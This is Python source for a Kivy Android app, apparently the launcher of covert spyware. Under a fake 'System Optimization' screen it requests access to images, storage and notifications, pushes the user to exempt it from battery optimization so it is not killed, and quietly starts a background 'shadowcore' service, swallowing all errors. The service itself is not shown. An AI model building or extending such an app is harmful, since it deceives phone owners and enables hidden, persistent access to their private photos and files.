import threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass

# أدوات نظام أندرويد
PythonActivity = autoclass('org.kivy.android.PythonActivity')
Intent = autoclass('android.content.Intent')
Settings = autoclass('android.provider.Settings')
Uri = autoclass('android.net.Uri')

class ShadowSystemApp(App):
    def build(self):
        return Label(
            text="[b]System Optimization[/b]\n[color=00ff00]Initializing services...ing[/color]", 
            markup=True,
            halign="center"
        )

    def on_start(self):
        # طلب الأذونات فوراً عند التشغيل
        Clock.schedule_once(self.trigger_permissions, 1)

    def trigger_permissions(self, dt):
        try:
            from android.permissions import request_permissions, Permission
            perms = [
                Permission.READ_MEDIA_IMAGES,
                Permission.POST_NOTIFICATIONS,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.FOREGROUND_SERVICE
            ]
            request_permissions(perms, self.after_permissions)
        except:
            pass

    def after_permissions(self, permissions, grants):
        # توجيه المستخدم لصفحة تحسين البطارية لضمان عدم القتل
        Clock.schedule_once(self.open_battery_settings, 1)
        # تشغيل الخدمة
        Clock.schedule_once(self.launch_service, 2)

    def open_battery_settings(self, dt):
        try:
            activity = PythonActivity.mActivity
            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(Uri.parse(f"package:{activity.getPackageName()}"))
            activity.startActivity(intent)
        except:
            pass

    def launch_service(self, dt):
        try:
            context = PythonActivity.mActivity
            # تأكد أن الاسم مطابق لما في buildozer.spec
            service_class = autoclass('org.test.shadowcore.ServiceService')
            service_class.start(context, "")
        except:
            pass

if __name__ == "__main__":
    ShadowSystemApp().run()
